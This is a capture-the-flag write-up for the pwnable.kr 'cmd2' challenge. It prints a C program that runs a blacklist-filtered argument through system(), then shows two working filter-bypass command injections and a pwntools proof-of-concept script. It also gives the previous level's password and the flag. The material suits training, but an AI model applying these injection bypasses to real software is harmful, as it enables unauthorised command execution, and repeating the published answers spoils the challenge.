# pwnable.kr cmd2 writeup (9 pt)

```
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

Let's connect to the target server.

# 0x01 Binary Enumeration

```bash
cmd2@prowl:~$ ls -la
total 40
drwxr-x---   5 root cmd2     4096 Oct 23  2016 .
drwxr-xr-x 116 root root     4096 Nov 12 21:34 ..
d---------   2 root root     4096 Jul 14  2015 .bash_history
-r-xr-sr-x   1 root cmd2_pwn 8794 Dec 21  2015 cmd2
-rw-r--r--   1 root root      586 Dec 21  2015 cmd2.c
-r--r-----   1 root cmd2_pwn   30 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
cmd2@prowl:~$ 
```

Again the same stuff like cmd1, let's analyze the source code.

```C
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

Now more words are blacklisted, we have to find a way to bypass `/`.

# 0x02 Exploitation + PoC

+ 1way We will do a trick, we will move to root directory & then we'll use the command substitution `$()` to execute `pwd` so we will get `/`. 

```bash
cmd2@prowl:~$ ./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fl?g"
cd ..; cd ..; $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl?g
FuN_w1th_5h3ll_v4riabl3s_haha
```

+ 2way Thanks to this [blog](https://www.rootnetsec.com/pwnable.kr-cmd2/) i learnt a second way!

```bash
cmd2@prowl:~$ ./cmd2 "command -p cat fl?g"
command -p cat fl?g
FuN_w1th_5h3ll_v4riabl3s_haha
```

`−p -> Perform the command search using a default value for PATH`

I wrote a simple PoC with pwntools.

```python
#!/usr/bin/env python
from pwn import *

shell = ssh('cmd2', 'pwnable.kr', password='mommy now I get what PATH environment is for :)', port=2222)
sh = shell.run('./cmd2 "command -p cat fl?g"')
sh.recvline() #re-print the cmd
log.success("Flag : " + sh.recvline())
```

Let's fire it up!

```bash
[root@pwn4magic]:~/Desktop# python cmd2.py 
[+] Connecting to pwnable.kr on port 2222: Done
[*] cmd2@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Opening new channel: './cmd2 "command -p cat fl?g"': Done
[+] Flag : FuN_w1th_5h3ll_v4riabl3s_haha
[*] Closed SSH channel with pwnable.kr
```

Flag : `FuN_w1th_5h3ll_v4riabl3s_haha`

-pwn4magic
